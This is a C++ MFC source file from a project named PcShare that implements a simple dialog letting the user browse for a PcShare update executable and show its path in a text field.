// MyUpdateDlg.cpp : implementation file
//

#include "stdafx.h"
#include "PcShare.h"
#include "MyUpdateDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CMyUpdateDlg dialog


CMyUpdateDlg::CMyUpdateDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CMyUpdateDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CMyUpdateDlg)
	m_Value = _T("");
	//}}AFX_DATA_INIT
}


void CMyUpdateDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CMyUpdateDlg)
	DDX_Text(pDX, IDC_EDIT_VALUE, m_Value);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CMyUpdateDlg, CDialog)
	//{{AFX_MSG_MAP(CMyUpdateDlg)
	ON_BN_CLICKED(IDC_BUTTON_FILE, OnButtonFile)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMyUpdateDlg message handlers

void CMyUpdateDlg::OnOK() 
{
	// TODO: Add extra validation here
	
	CDialog::OnOK();
}

void CMyUpdateDlg::OnCancel() 
{
	
	CDialog::OnCancel();
}

void CMyUpdateDlg::OnButtonFile() 
{
	OPENFILENAME OpenFileName = {0};
	TCHAR szFile[MAX_PATH] = {0};
	TCHAR szFileName[MAX_PATH] = {0};
  	TCHAR szFilter[1024] = {0};
	lstrcpy(szFilter, _T("PcShare更新文件(*.exe)"));
	lstrcpy(szFilter + lstrlen(szFilter) + 1, _T("*.exe"));
	OpenFileName.lStructSize       = sizeof(OPENFILENAME);
    OpenFileName.hwndOwner         = GetSafeHwnd();
	OpenFileName.lpstrFilter       = szFilter;
    OpenFileName.lpstrCustomFilter = NULL;
    OpenFileName.nMaxCustFilter    = 0;
    OpenFileName.nFilterIndex      = 0;
    OpenFileName.lpstrFile         = szFile;
    OpenFileName.nMaxFile          = sizeof(szFile);
    OpenFileName.lpstrFileTitle    = szFileName;
    OpenFileName.nMaxFileTitle     = sizeof(szFileName);
    OpenFileName.lpstrInitialDir   = NULL;
    OpenFileName.lpstrTitle        = _T("选择PcShare更新文件");
    OpenFileName.nFileOffset       = 0;
    OpenFileName.nFileExtension    = 0;
    OpenFileName.lpstrDefExt       = NULL;
    OpenFileName.Flags             = OFN_EXPLORER | OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT;
	if(!GetOpenFileName(&OpenFileName))
	{
		return;
	}
	m_Value = szFile;
	UpdateData(FALSE);	
}
